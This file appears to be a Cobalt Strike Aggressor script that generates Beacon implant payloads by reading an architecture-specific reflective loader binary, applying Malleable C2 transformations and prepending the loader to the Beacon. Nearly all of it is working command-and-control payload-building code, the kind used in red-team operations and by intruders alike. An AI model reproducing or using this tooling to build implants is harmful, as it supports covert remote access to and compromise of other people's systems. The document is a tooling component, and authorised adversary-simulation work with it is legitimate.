# ===========================================================================
#                     Default UDRL (Prepend Style)
# ===========================================================================

# Print information to the Script Console
sub print_info {
   println(formatDate("[HH:mm:ss] ") . "\cE[Default-UDRL]\o " . $1);
}

print_info("Default Loader (Prepend)");

# ===========================================================================
#                     Prepend UDRL to Beacon Payload
# ===========================================================================

set BEACON_RDLL_GENERATE {
    # Declare local variables
    local('$arch $beacon $file_handle $ldr $loader_path $payload');
    $beacon = $2;
    $arch = $3;

    print_info("Generating payload for architecture: $arch");

    # Read the UDRL from the supplied binary file
    $loader_path = getFileProper(script_resource("Release"), $arch, "default-loader." . $arch . ".bin");
    $file_handle = openf($loader_path);
    $ldr = readb($file_handle, -1);
    closef($file_handle);
    
    if (strlen($ldr) == 0) {
        warn("Error: Failed to read $loader_path");
        return $null;
    }
    
    print_info("Loader size: " . strlen($ldr) . " bytes");

    # Apply Malleable C2 Profile transformations
    $beacon = setup_transformations($beacon, $arch);
    print_info("Malleable C2 transformations applied");

    # Setup strings (if defined in profile)
    $beacon = setup_strings($beacon);

    # Prepend UDRL to Beacon payload
    $payload = $ldr . $beacon;

    print_info("Final payload size: " . strlen($payload) . " bytes");
    print_info("Prepending UDRL to beacon payload");

    return $payload;
}

# ===========================================================================
#                     Set Beacon RDLL Size Limit
# ===========================================================================
set BEACON_RDLL_SIZE {
    # Return "0" to use 100KB limit (suitable for Prepend style)
    # If your loader is larger than 5KB, increase this value
    return "0";
}

# Completion message
print_info("Default UDRL configuration loaded successfully");
